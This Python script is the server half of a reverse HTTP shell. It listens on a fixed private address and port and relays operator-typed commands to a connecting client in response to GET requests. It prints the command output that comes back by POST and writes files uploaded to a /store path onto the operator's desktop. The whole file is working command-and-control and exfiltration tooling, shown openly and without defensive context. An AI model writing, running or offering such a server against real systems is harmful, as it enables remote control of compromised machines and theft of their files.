#Python Reverse HTTP Shell
#HTTP Server to handle client request
import http.server
import os, cgi

HOST_NAME = "192.168.100.137"
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        command = input("Shell> ")
        self.send_response(200)
        self.send_header('Content-type', "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers= self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-] Unexpected POST request')
                fs_up = fs['file']
                with open('/root/Desktop/place_holder.txt', 'wb') as o:
                    print('[+] Writing file ...')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        #start http service forever
        httpd.serve_forever()
        # Ctrl + C to stop via keyboard interupt
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()

